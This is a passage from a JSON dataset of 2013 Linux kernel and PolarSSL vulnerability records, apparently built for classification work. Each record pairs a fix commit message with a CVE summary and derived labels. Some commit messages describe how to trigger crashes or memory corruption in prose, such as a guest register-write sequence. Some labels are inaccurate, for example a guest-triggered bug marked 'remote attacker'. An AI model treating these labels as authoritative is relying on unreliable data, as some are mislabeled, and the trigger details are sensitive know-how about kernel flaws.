attacker"},{"commit_id":"17d68b763f09a9ce824ae23eb62c9efc57b69271","cve_id":"CVE-2013-6376","cwe_id":"CWE-189","commit_message":"KVM: x86: fix guest-initiated crash with x2apic (CVE-2013-6376)\n\nA guest can cause a BUG_ON() leading to a host kernel crash.\nWhen the guest writes to the ICR to request an IPI, while in x2apic\nmode the following things happen, the destination is read from\nICR2, which is a register that the guest can control.\n\nkvm_irq_delivery_to_apic_fast uses the high 16 bits of ICR2 as the\ncluster id.  A BUG_ON is triggered, which is a protection against\naccessing map->logical_map with an out-of-bounds access and manages\nto avoid that anything really unsafe occurs.\n\nThe logic in the code is correct from real HW point of view. The problem\nis that KVM supports only one cluster with ID 0 in clustered mode, but\nthe code that has the bug does not take this into account.\n\nReported-by: Lars Bull <larsbull@google.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Gleb Natapov <gleb@redhat.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"The recalculate_apic_map function in arch\/x86\/kvm\/lapic.c in the KVM subsystem in the Linux kernel through 3.12.5 allows guest OS users to cause a denial of service (host OS crash) via a crafted ICR write operation in x2apic mode.","commit_message_1":"x86 : fix guest-initiated crash with x2apic ( <cve_id> ) a guest can cause a bug_on ( ) leading to a host kernel crash","Vulnerability Type":"Numeric Errors","Attack Vector":"via a crafted icr write operation in x2apic mode","Impact":"cause a denial of service ( host os crash )","Root Cause":"caused by a invalid dereference error","Attack Type":"local attacker"},{"commit_id":"fda4e2e85589191b123d31cdc21fd33ee70f50fd","cve_id":"CVE-2013-6368","cwe_id":"CWE-20","commit_message":"KVM: x86: Convert vapic synchronization to _cached functions (CVE-2013-6368)\n\nIn kvm_lapic_sync_from_vapic and kvm_lapic_sync_to_vapic there is the\npotential to corrupt kernel memory if userspace provides an address that\nis at the end of a page.  This patches concerts those functions to use\nkvm_write_guest_cached and kvm_read_guest_cached.  It also checks the\nvapic_address specified by userspace during ioctl processing and returns\nan error to userspace if the address is not a valid GPA.\n\nThis is generally not guest triggerable, because the required write is\ndone by firmware that runs before the guest.  Also, it only affects AMD\nprocessors and oldish Intel that do not have the FlexPriority feature\n(unless you disable FlexPriority, of course; then newer processors are\nalso affected).\n\nFixes: b93463aa59d6 ('KVM: Accelerated apic support')\n\nReported-by: Andrew Honig <ahonig@google.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Andrew Honig <ahonig@google.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"The KVM subsystem in the Linux kernel through 3.12.5 allows local users to gain privileges or cause a denial of service (system crash) via a VAPIC synchronization operation involving a page-end address.","commit_message_1":"x86 : convert vapic synchronization to _cached function ( <cve_id> ) in kvm_lapic_sync_from_vapic and kvm_lapic_sync_to_vapic there is the potential to corrupt kernel memory if userspace provides an address that is at the end of a page","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a vapic synchronization operation involving a page - end address","Impact":"gain privileges or cause a denial of service ( system crash )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"b963a22e6d1a266a67e9eecc88134713fd54775c","cve_id":"CVE-2013-6367","cwe_id":"CWE-189","commit_message":"KVM: x86: Fix potential divide by 0 in lapic (CVE-2013-6367)\n\nUnder guest controllable circumstances apic_get_tmcct will execute a\ndivide by zero and cause a crash.  If the guest cpuid support\ntsc deadline timers and performs the following sequence of requests\nthe host will crash.\n- Set the mode to periodic\n- Set the TMICT to 0\n- Set the mode bits to 11 (neither periodic, nor one shot, nor tsc deadline)\n- Set the TMICT to non-zero.\nThen the lapic_timer.period will be 0, but the TMICT will not be.  If the\nguest then reads from the TMCCT then the host will perform a divide by 0.\n\nThis patch ensures that if the lapic_timer.period is 0, then the division\ndoes not occur.\n\nReported-by: Andrew Honig <ahonig@google.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Andrew Honig <ahonig@google.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"The apic_get_tmcct function in arch\/x86\/kvm\/lapic.c in the KVM subsystem in the Linux kernel through 3.12.5 allows guest OS users to cause a denial of service (divide-by-zero error and host OS crash) via crafted modifications of the TMICT value.","commit_message_1":"x86 : fix potential divide by <number> in lapic ( <cve_id> ) under guest controllable circumstance apic_get_tmcct will execute a divide by zero and cause a crash","Vulnerability Type":"Numeric Errors","Attack Vector":"via crafted modifications of the tmict value","Impact":"cause a denial of service ( divide - by - zero error and host os crash )","Root Cause":"caused by a divide-by-zero error","Attack Type":"remote attacker"},{"commit_id":"8404663f81d212918ff85f493649a7991209fa04","cve_id":"CVE-2013-6282","cwe_id":"CWE-20","commit_message":"ARM: 7527\/1: uaccess: explicitly check __user pointer when !CPU_USE_DOMAINS\n\nThe {get,put}_user macros don't perform range checking on the provided\n__user address when !CPU_HAS_DOMAINS.\n\nThis patch reworks the out-of-line assembly accessors to check the user\naddress against a specified limit, returning -EFAULT if is is out of\nrange.\n\n[will: changed get_user register allocation to match put_user]\n[rmk: fixed building on older ARM architectures]\n\nReported-by: Catalin Marinas <catalin.marinas@arm.com>\nSigned-off-by: Will Deacon <will.deacon@arm.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Russell King <rmk+kernel@arm.linux.org.uk>","summary":"The (1) get_user and (2) put_user API functions in the Linux kernel before 3.5.5 on the v6k and v7 ARM platforms do not validate certain addresses, which allows attackers to read or modify the contents of arbitrary kernel memory locations via a crafted application, as exploited in the wild against Android devices in October and November 2013.","commit_message_1":"<number>\/<number> : uaccess : explicitly check __user pointer when ! cpu_use_domains the { get , put } _user macro do n't perform range checking on the provided __user address when ! cpu_has_domains","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted application , as exploited in the wild against android devices in october and november 2013","Impact":"read or modify the contents of arbitrary kernel memory locations","Root Cause":"do not validate certain addresses","Attack Type":"local attacker"},{"commit_id":"e8180dcaa8470ceca21109f143876fdcd9fe050a","cve_id":"CVE-2013-5634","cwe_id":"CWE-399","commit_message":"ARM: KVM: prevent NULL pointer dereferences with KVM VCPU ioctl\n\nSome ARM KVM VCPU ioctls require the vCPU to be properly initialized\nwith the KVM_ARM_VCPU_INIT ioctl before being used with further\nrequests. KVM_RUN checks whether this initialization has been\ndone, but other ioctls do not.\nNamely KVM_GET_REG_LIST will dereference an array with index -1\nwithout initialization and thus leads to a kernel oops.\nFix this by adding checks before executing the ioctl handlers.\n\n [ Removed superflous comment from static function - Christoffer ]\n\nChanges from v1:\n * moved check into a static function with a meaningful name\n\nSigned-off-by: Andre Przywara <andre.przywara@linaro.org>\nSigned-off-by: Christoffer Dall <cdall@cs.columbia.edu>","summary":"arch\/arm\/kvm\/arm.c in the Linux kernel before 3.10 on the ARM platform, when KVM is used, allows host OS users to cause a denial of service (NULL pointer dereference, OOPS, and host OS crash) or possibly have unspecified other impact by omitting vCPU initialization before a KVM_GET_REG_LIST ioctl call.","commit_message_1":"kvm : prevent null pointer dereferences with kvm vcpu ioctl some arm kvm vcpu ioctls require the vcpu to be properly initialized with the kvm_arm_vcpu_init ioctl before being used with further request","Vulnerability Type":"Resource Management Errors","Attack Vector":"by omitting vcpu initialization before a kvm _ get _ reg _ list ioctl call","Impact":"cause a denial of service ( pointer dereference , oops , and host os crash ) or possibly have unspecified other impact","Root Cause":"caused by a NULL pointer dereference","Attack Type":"attacker"},{"commit_id":"1922a4e6aade7b1d685af19d4d9339ddb5c02859","cve_id":"CVE-2013-4623","cwe_id":"CWE-20","commit_message":"ssl_parse_certificate() now calls x509parse_crt_der() directly","summary":"The x509parse_crt function in x509.h in PolarSSL 1.1.x before 1.1.7 and 1.2.x before 1.2.8 does not properly parse certificate messages during the SSL\/TLS handshake, which allows remote attackers to cause a denial of service (infinite loop and CPU consumption) via a certificate message that contains a PEM encoded certificate.","commit_message_1":"ssl_parse_certificate ( ) now call x509parse_crt_der ( ) directly","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a certificate message that contains a pem encoded certificate","Impact":"cause a denial of service ( infinite loop and cpu consumption )","Root Cause":"does not properly parse certificate messages during the ssl \/ tls handshake","Attack Type":"remote attacker"},{"commit_id":"12d6e7538e2d418c08f082b1b44ffa5fb7270ed8","cve_id":"CVE-2013-4592","cwe_id":"CWE-399","commit_message":"KVM: perform an invalid memslot step for gpa base change\n\nPPC must flush all translations before the new memory slot\nis visible.\n\nSigned-off-by: Marcelo Tosatti <mtosatti@redhat.com>\nSigned-off-by: Avi Kivity <avi@redhat.com>","summary":"Memory leak in the __kvm_set_memory_region function in virt\/kvm\/kvm_main.c in the Linux kernel before 3.9 allows local users to cause a denial of service (memory consumption) by leveraging certain device access to trigger movement of memory slots.","commit_message_1":"perform an invalid memslot step for gpa base change ppc must flush all translation before the new memory slot is visible","Vulnerability Type":"Resource Management Errors","Attack Vector":"by leveraging certain device access to trigger movement of memory slots","Impact":"cause a denial of service ( memory consumption )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"7d3e91a89b7adbc2831334def9e494dd9892f9af","cve_id":"CVE-2013-4591","cwe_id":"CWE-119","commit_message":"NFSv4: Check for buffer length in __nfs4_get_acl_uncached\n\nCommit 1f1ea6c \"NFSv4: Fix buffer overflow checking in\n__nfs4_get_acl_uncached\" accidently dropped the checking for too small\nresult buffer length.\n\nIf someone uses getxattr on \"system.nfs4_acl\" on an NFSv4 mount\nsupporting ACLs, the ACL has not been cached and the buffer suplied is\ntoo short, we still copy the complete ACL, resulting in kernel and user\nspace memory corruption.\n\nSigned-off-by: Sven Wegener <sven.wegener@stealer.net>\nCc: stable@kernel.org\nSigned-off-by: Trond Myklebust <Trond.Myklebust@netapp.com>","summary":"Buffer overflow in the __nfs4_get_acl_uncached function in fs\/nfs\/nfs4proc.c in the Linux kernel before 3.7.2 allows local users to cause a denial of service (memory corruption and system crash) or possibly have unspecified other impact via a getxattr system call for the system.nfs4_acl extended attribute of a pathname on an NFSv4 filesystem.","commit_message_1":"check for buffer length in __nfs4_get_acl_uncached commit 1f1ea6c `` nfsv4 : fix buffer overflow checking in __nfs4_get_acl_uncached '' accidently dropped the checking for too small result buffer length","Vulnerability Type":"buffer overflow","Attack Vector":"via a getxattr system call for the system . nfs4 _ acl extended attribute of a pathname on an nfsv4 filesystem","Impact":"cause a denial of service ( memory corruption and system crash ) or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking by the __nfs4_get_acl_uncached() method","Attack Type":"local attacker"},{"commit_id":"04bcef2a83f40c6db24222b27a52892cba39dffb","cve_id":"CVE-2013-4588","cwe_id":"CWE-119","commit_message":"ipvs: Add boundary check on ioctl arguments\n\nThe ipvs code has a nifty system for doing the size of ioctl command\ncopies; it defines an array with values into which it indexes the cmd\nto find the right length.\n\nUnfortunately, the ipvs code forgot to check if the cmd was in the\nrange that the array provides, allowing for an index outside of the\narray, which then gives a \"garbage\" result into the length, which\nthen gets used for copying into a stack buffer.\n\nFix this by adding sanity checks on these as well as the copy size.\n\n[ horms@verge.net.au: adjusted limit to IP_VS_SO_GET_MAX ]\nSigned-off-by: Arjan van de Ven <arjan@linux.intel.com>\nAcked-by: Julian Anastasov <ja@ssi.bg>\nSigned-off-by: Simon Horman <horms@verge.net.au>\nSigned-off-by: Patrick McHardy <kaber@trash.net>","summary":"Multiple stack-based buffer overflows in net\/netfilter\/ipvs\/ip_vs_ctl.c in the Linux kernel before 2.6.33, when CONFIG_IP_VS is used, allow local users to gain privileges by leveraging the CAP_NET_ADMIN capability for (1) a getsockopt system call, related to the do_ip_vs_get_ctl function, or (2) a setsockopt system call, related to the do_ip_vs_set_ctl function.","commit_message_1":"add boundary check on ioctl argument the ipv code ha a nifty system for doing the size of ioctl command copy ; it defines an array with value into which it index the cmd to find the right length","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging the cap _ net _ admin capability for ( 1 ) a getsockopt system call , related to the do _ ip _ vs _ get _ ctl function , or ( 2 ) a setsockopt system call , related to the do _ ip _ vs _ set _ ctl function","Impact":"gain privileges","Root Cause":"when config _ ip _ vs is used","Attack Type":"local attacker"},{"commit_id":"338c7dbadd2671189cec7faf64c84d01071b3f96","cve_id":"CVE-2013-4587","cwe_id":"CWE-20","commit_message":"KVM: Improve create VCPU parameter (CVE-2013-4587)\n\nIn multiple functions the vcpu_id is used as an offset into a bitfield.  Ag\nmalicious user could specify a vcpu_id greater than 255 in order to set or\nclear bits in kernel memory.  This could be used to elevate priveges in the\nkernel.  This patch verifies that the vcpu_id provided is less than 255.\nThe api documentation already specifies that the vcpu_id must be less than\nmax_vcpus, but this is currently not checked.\n\nReported-by: Andrew Honig <ahonig@google.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Andrew Honig <ahonig@google.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"Array index error in the kvm_vm_ioctl_create_vcpu function in virt\/kvm\/kvm_main.c in the KVM subsystem in the Linux kernel through 3.12.5 allows local users to gain privileges via a large id value.","commit_message_1":"improve create vcpu parameter ( <cve_id> ) in multiple function the vcpu_id is used a an offset into a bitfield","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a large id value","Impact":"gain privileges","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"0e033e04c2678dbbe74a46b23fffb7bb918c288e","cve_id":"CVE-2013-4563","cwe_id":"CWE-189","commit_message":"ipv6: fix headroom calculation in udp6_ufo_fragment\n\nCommit 1e2bd517c108816220f262d7954b697af03b5f9c (\"udp6: Fix udp\nfragmentation for tunnel traffic.\") changed the calculation if\nthere is enough space to include a fragment header in the skb from a\nskb->mac_header dervived one to skb_headroom. Because we already peeled\noff the skb to transport_header this is wrong. Change this back to check\nif we have enough room before the mac_header.\n\nThis fixes a panic Saran Neti reported. He used the tbf scheduler which\nskb_gso_segments the skb. The offsets get negative and we panic in memcpy\nbecause the skb was erroneously not expanded at the head.\n\nReported-by: Saran Neti <Saran.Neti@telus.com>\nCc: Pravin B Shelar <pshelar@nicira.com>\nSigned-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The udp6_ufo_fragment function in net\/ipv6\/udp_offload.c in the Linux kernel through 3.12, when UDP Fragmentation Offload (UFO) is enabled, does not properly perform a certain size comparison before inserting a fragment header, which allows remote attackers to cause a denial of service (panic) via a large IPv6 UDP packet, as demonstrated by use of the Token Bucket Filter (TBF) queueing discipline.","commit_message_1":"fix headroom calculation in udp6_ufo_fragment commit 1e2bd517c108816220f262d7954b697af03b5f9c ( `` udp6 : fix udp fragmentation for tunnel traffic","Vulnerability Type":"Numeric Errors","Attack Vector":"via a large ipv6 udp packet , as demonstrated by use of the token bucket filter ( tbf ) queueing discipline","Impact":"cause a denial of service ( panic )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"8d1e72250c847fa96498ec029891de4dc638a5ba","cve_id":"CVE-2013-4515","cwe_id":"CWE-200","commit_message":"Staging: bcm: info leak in ioctl\n\nThe DevInfo.u32Reserved[] array isn't initialized so it leaks kernel\ninformation to user space.\n\nReported-by: Nico Golde <nico@ngolde.de>\nReported-by: Fabian Yamaguchi <fabs@goesec.de>\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The bcm_char_ioctl function in drivers\/staging\/bcm\/Bcmchar.c in the Linux kernel before 3.12 does not initialize a certain data structure, which allows local users to obtain sensitive information from kernel memory via an IOCTL_BCM_GET_DEVICE_DRIVER_INFO ioctl call.","commit_message_1":"bcm : info leak in ioctl the <file> [ ] array is n't initialized so it leak kernel information to user space","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via an ioctl _ bcm _ get _ device _ driver _ info ioctl call","Impact":"obtain sensitive information from kernel memory","Root Cause":"does not initialize a certain data structure","Attack Type":"local attacker"},{"commit_id":"b5e2f339865fb443107e5b10603e53bbc92dc054","cve_id":"CVE-2013-4514","cwe_id":"CWE-119","commit_message":"staging: wlags49_h2: buffer overflow setting station name\n\nWe need to check the length parameter before doing the memcpy().  I've\nactually changed it to strlcpy() as well so that it's NUL terminated.\n\nYou need CAP_NET_ADMIN to trigger these so it's not the end of the\nworld.\n\nReported-by: Nico Golde <nico@ngolde.de>\nReported-by: Fabian Yamaguchi <fabs@goesec.de>\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Multiple buffer overflows in drivers\/staging\/wlags49_h2\/wl_priv.c in the Linux kernel before 3.12 allow local users to cause a denial of service or possibly have unspecified other impact by leveraging the CAP_NET_ADMIN capability and providing a long station-name string, related to the (1) wvlan_uil_put_info and (2) wvlan_set_station_nickname functions.","commit_message_1":"wlags49_h2 : buffer overflow setting station name we need to check the length parameter before doing the memcpy ( )","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging the cap _ net _ admin capability and providing a long station - name string , related to the ( 1 ) wvlan _ uil _ put _ info and ( 2 ) wvlan _ set _ station _ nickname functions","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking by the drivers\/staging\/wlags49_h2\/wl_priv.c function","Attack Type":"local attacker"},{"commit_id":"c2c65cd2e14ada6de44cb527e7f1990bede24e15","cve_id":"CVE-2013-4513","cwe_id":"CWE-119","commit_message":"staging: ozwpan: prevent overflow in oz_cdev_write()\n\nWe need to check \"count\" so we don't overflow the ei->data buffer.\n\nReported-by: Nico Golde <nico@ngolde.de>\nReported-by: Fabian Yamaguchi <fabs@goesec.de>\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Buffer overflow in the oz_cdev_write function in drivers\/staging\/ozwpan\/ozcdev.c in the Linux kernel before 3.12 allows local users to cause a denial of service or possibly have unspecified other impact via a crafted write operation.","commit_message_1":"ozwpan : prevent overflow in oz_cdev_write ( ) we need to check `` count '' so we do n't overflow the ei- > data buffer","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted write operation","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking by the oz_cdev_write() function","Attack Type":"local attacker"},{"commit_id":"201f99f170df14ba52ea4c52847779042b7a623b","cve_id":"CVE-2013-4512","cwe_id":"CWE-119","commit_message":"uml: check length in exitcode_proc_write()\n\nWe don't cap the size of buffer from the user so we could write past the\nend of the array here.  Only root can write to this file.\n\nReported-by: Nico Golde <nico@ngolde.de>\nReported-by: Fabian Yamaguchi <fabs@goesec.de>\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Buffer overflow in the exitcode_proc_write function in arch\/um\/kernel\/exitcode.c in the Linux kernel before 3.12 allows local users to cause a denial of service or possibly have unspecified other impact by leveraging root privileges for a write operation.","commit_message_1":"check length in exitcode_proc_write ( ) we do n't cap the size of buffer from the user so we could write past the end of the array here","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging root privileges for a write operation","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking by the exitcode_proc_write()function","Attack Type":"local attacker"},{"commit_id":"6062a8dc0517bce23e3c2f7d2fea5e22411269a3","cve_id":"CVE-2013-4483","cwe_id":"CWE-189","commit_message":"ipc,sem: fine grained locking for semtimedop\n\nIntroduce finer grained locking for semtimedop, to handle the common case\nof a program wanting to manipulate one semaphore from an array with\nmultiple semaphores.\n\nIf the call is a semop manipulating just one semaphore in an array with\nmultiple semaphores, only take the lock for that semaphore itself.\n\nIf the call needs to manipulate multiple semaphores, or another caller is\nin a transaction that manipulates multiple semaphores, the sem_array lock\nis taken, as well as all the locks for the individual semaphores.\n\nOn a 24 CPU system, performance numbers with the semop-multi\ntest with N threads and N semaphores, look like this:\n\n\tvanilla\t\tDavidlohr's\tDavidlohr's +\tDavidlohr's +\nthreads\t\t\tpatches\t\trwlock patches\tv3 patches\n10\t610652\t\t726325\t\t1783589\t\t2142206\n20\t341570\t\t365699\t\t1520453\t\t1977878\n30\t288102\t\t307037\t\t1498167\t\t2037995\n40\t290714\t\t305955\t\t1612665\t\t2256484\n50\t288620\t\t312890\t\t1733453\t\t2650292\n60\t289987\t\t306043\t\t1649360\t\t2388008\n70\t291298\t\t306347\t\t1723167\t\t2717486\n80\t290948\t\t305662\t\t1729545\t\t2763582\n90\t290996\t\t306680\t\t1736021\t\t2757524\n100\t292243\t\t306700\t\t1773700\t\t3059159\n\n[davidlohr.bueso@hp.com: do not call sem_lock when bogus sma]\n[davidlohr.bueso@hp.com: make refcounter atomic]\nSigned-off-by: Rik van Riel <riel@redhat.com>\nSuggested-by: Linus Torvalds <torvalds@linux-foundation.org>\nAcked-by: Davidlohr Bueso <davidlohr.bueso@hp.com>\nCc: Chegu Vinod <chegu_vinod@hp.com>\nCc: Jason Low <jason.low2@hp.com>\nReviewed-by: Michel Lespinasse <walken@google.com>\nCc: Peter Hurley <peter@hurleysoftware.com>\nCc: Stanislav Kinsbursky <skinsbursky@parallels.com>\nTested-by: Emmanuel Benisty <benisty.e@gmail.com>\nTested-by: Sedat Dilek <sedat.dilek@gmail.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The ipc_rcu_putref function in ipc\/util.c in the Linux kernel before 3.10 does not properly manage a reference count, which allows local users to cause a denial of service (memory consumption or system crash) via a crafted application.","commit_message_1":"fine grained locking for semtimedop introduce finer grained locking for semtimedop , to handle the common case of a program wanting to manipulate one semaphore from an array with multiple semaphore","Vulnerability Type":"Numeric Errors","Attack Vector":"via a crafted application","Impact":"cause a denial of service ( memory consumption or system crash )","Root Cause":"does not properly manage a reference count","Attack Type":"local attacker"},{"commit_id":"e93b7d748be887cd7639b113ba7d7ef792a7efb9","cve_id":"CVE-2013-4470","cwe_id":"CWE-264","commit_message":"ip_output: do skb ufo init for peeked non ufo skb as well\n\nNow, if user application does:\nsendto len<mtu flag MSG_MORE\nsendto len>mtu flag 0\nThe skb is not treated as fragmented one because it is not initialized\nthat way. So move the initialization to fix this.\n\nintroduced by:\ncommit e89e9cf539a28df7d0eb1d0a545368e9920b34ac \"[IPv4\/IPv6]: UFO Scatter-gather approach\"\n\nSigned-off-by: Jiri Pirko <jiri@resnulli.us>\nAcked-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The Linux kernel before 3.12, when UDP Fragmentation Offload (UFO) is enabled, does not properly initialize certain data structures, which allows local users to cause a denial of service (memory corruption and system crash) or possibly gain privileges via a crafted application that uses the UDP_CORK option in a setsockopt system call and sends both short and long packets, related to the ip_ufo_append_data function in net\/ipv4\/ip_output.c and the ip6_ufo_append_data function in net\/ipv6\/ip6_output.c.","commit_message_1":"do skb ufo init for peeked non ufo skb a well now , if user application doe : sendto len < mtu flag msg_more sendto len > mtu flag <number> the skb is not treated a fragmented one because it is not initialized that way","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted application that uses the udp _ cork option in a setsockopt system call and sends both short and long packets , related to the ip _ ufo _ append _ data function in net \/ ipv4 \/ ip _ output . c and the ip6 _ ufo _ append _ data function in net \/ ipv6","Impact":"cause a denial of service ( memory corruption and system crash ) or possibly gain privileges","Root Cause":"when UDP Fragmentation Offload (UFO) is enabled, does not properly initialize certain data structures","Attack Type":"local attacker"},{"commit_id":"2811ebac2521ceac84f2bdae402455baa6a7fb47","cve_id":"CVE-2013-4387","cwe_id":"CWE-119","commit_message":"ipv6: udp packets following an UFO enqueued packet need also be handled by UFO\n\nIn the following scenario the socket is corked:\nIf the first UDP packet is larger then the mtu we try to append it to the\nwrite queue via ip6_ufo_append_data. A following packet, which is smaller\nthan the mtu would be appended to the already queued up gso-skb via\nplain ip6_append_data. This causes random memory corruptions.\n\nIn ip6_ufo_append_data we also have to be careful to not queue up the\nsame skb multiple times. So setup the gso frame only when no first skb\nis available.\n\nThis also fixes a shortcoming where we add the current packet's length to\ncork->length but return early because of a packet > mtu with dontfrag set\n(instead of sutracting it again).\n\nFound with trinity.\n\nCc: YOSHIFUJI Hideaki <yoshfuji@linux-ipv6.org>\nSigned-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"net\/ipv6\/ip6_output.c in the Linux kernel through 3.11.4 does not properly determine the need for UDP Fragmentation Offload (UFO) processing of small packets after the UFO queueing of a large packet, which allows remote attackers to cause a denial of service (memory corruption and system crash) or possibly have unspecified other impact via network traffic that triggers a large response packet.","commit_message_1":"udp packet following an ufo enqueued packet need also be handled by ufo in the following scenario the socket is corked : if the first udp packet is larger then the mtu we try to append it to the write queue via ip6_ufo_append_data","Vulnerability Type":"buffer overflow","Attack Vector":"via network traffic that triggers a large response packet","Impact":"cause a denial of service ( memory corruption and system crash ) or possibly have unspecified other impact","Root Cause":"does not properly determine the need for udp fragmentation offload ( ufo ) processing of small packets after the ufo queueing of a large packet","Attack Type":"remote attacker"},{"commit_id":"95ee62083cb6453e056562d91f597552021e6ae7","cve_id":"CVE-2013-4350","cwe_id":"CWE-310","commit_message":"net: sctp: fix ipv6 ipsec encryption bug in sctp_v6_xmit\n\nAlan Chester reported an issue with IPv6 on SCTP that IPsec traffic is not\nbeing encrypted, whereas on IPv4 it is. Setting up an AH + ESP transport\ndoes not seem to have the desired effect:\n\nSCTP + IPv4:\n\n  22:14:20.809645 IP (tos 0x2,ECT(0), ttl 64, id 0, offset 0, flags [DF], proto AH (51), length 116)\n    192.168.0.2 > 192.168.0.5: AH(spi=0x00000042,sumlen=16,seq=0x1): ESP(spi=0x00000044,seq=0x1), length 72\n  22:14:20.813270 IP (tos 0x2,ECT(0), ttl 64, id 0, offset 0, flags [DF], proto AH (51), length 340)\n    192.168.0.5 > 192.168.0.2: AH(spi=0x00000043,sumlen=16,seq=0x1):\n\nSCTP + IPv6:\n\n  22:31:19.215029 IP6 (class 0x02, hlim 64, next-header SCTP (132) payload length: 364)\n    fe80::222:15ff:fe87:7fc.3333 > fe80::92e6:baff:fe0d:5a54.36767: sctp\n    1) [INIT ACK] [init tag: 747759530] [rwnd: 62464] [OS: 10] [MIS: 10]\n\nMoreover, Alan says:\n\n  This problem was seen with both Racoon and Racoon2. Other people have seen\n  this with OpenSwan. When IPsec is configured to encrypt all upper layer\n  protocols the SCTP connection does not initialize. After using Wireshark to\n  follow packets, this is because the SCTP packet leaves Box A unencrypted and\n  Box B believes all upper layer protocols are to be encrypted so it drops\n  this packet, causing the SCTP connection to fail to initialize. When IPsec\n  is configured to encrypt just SCTP, the SCTP packets are observed unencrypted.\n\nIn fact, using `socat sctp6-listen:3333 -` on one end and transferring \"plaintext\"\nstring on the other end, results in cleartext on the wire where SCTP eventually\ndoes not report any errors, thus in the latter case that Alan reports, the\nnon-paranoid user might think he's communicating over an encrypted transport on\nSCTP although he's not (tcpdump ... -X):\n\n  ...\n  0x0030: 5d70 8e1a 0003 001a 177d eb6c 0000 0000  ]p.......}.l....\n  0x0040: 0000 0000 706c 6169 6e74 6578 740a 0000  ....plaintext...\n\nOnly in \/proc\/net\/xfrm_stat we can see XfrmInTmplMismatch increasing on the\nreceiver side. Initial follow-up analysis from Alan's bug report was done by\nAlexey Dobriyan. Also thanks to Vlad Yasevich for feedback on this.\n\nSCTP has its own implementation of sctp_v6_xmit() not calling inet6_csk_xmit().\nThis has the implication that it probably never really got updated along with\nchanges in inet6_csk_xmit() and therefore does not seem to invoke xfrm handlers.\n\nSCTP's IPv4 xmit however, properly calls ip_queue_xmit() to do the work. Since\na call to inet6_csk_xmit() would solve this problem, but result in unecessary\nroute lookups, let us just use the cached flowi6 instead that we got through\nsctp_v6_get_dst(). Since all SCTP packets are being sent through sctp_packet_transmit(),\nwe do the route lookup \/ flow caching in sctp_transport_route(), hold it in\ntp->dst and skb_dst_set() right after that. If we would alter fl6->daddr in\nsctp_v6_xmit() to np->opt->srcrt, we possibly could run into the same effect\nof not having xfrm layer pick it up, hence, use fl6_update_dst() in sctp_v6_get_dst()\ninstead to get the correct source routed dst entry, which we assign to the skb.\n\nAlso source address routing example from 625034113 (\"sctp: fix sctp to work with\nipv6 source address routing\") still works with this patch! Nevertheless, in RFC5095\nit is actually 'recommended' to not use that anyway due to traffic amplification [1].\nSo it seems we're not supposed to do that anyway in sctp_v6_xmit(). Moreover, if\nwe overwrite the flow destination here, the lower IPv6 layer will be unable to\nput the correct destination address into IP header, as routing header is added in\nipv6_push_nfrag_opts() but then probably with wrong final destination. Things aside,\nresult of this patch is that we do not have any XfrmInTmplMismatch increase plus on\nthe wire with this patch it now looks like:\n\nSCTP + IPv6:\n\n  08:17:47.074080 IP6 2620:52:0:102f:7a2b:cbff:fe27:1b0a > 2620:52:0:102f:213:72ff:fe32:7eba:\n    AH(spi=0x00005fb4,seq=0x1): ESP(spi=0x00005fb5,seq=0x1), length 72\n  08:17:47.074264 IP6 2620:52:0:102f:213:72ff:fe32:7eba > 2620:52:0:102f:7a2b:cbff:fe27:1b0a:\n    AH(spi=0x00003d54,seq=0x1): ESP(spi=0x00003d55,seq=0x1), length 296\n\nThis fixes Kernel Bugzilla 24412. This security issue seems to be present since\n2.6.18 kernels. Lets just hope some big passive adversary in the wild didn't have\nits fun with that. lksctp-tools IPv6 regression test suite passes as well with\nthis patch.\n\n [1] http:\/\/www.secdev.org\/conf\/IPv6_RH_security-csw07.pdf\n\nReported-by: Alan Chester <alan.chester@tekelec.com>\nReported-by: Alexey Dobriyan 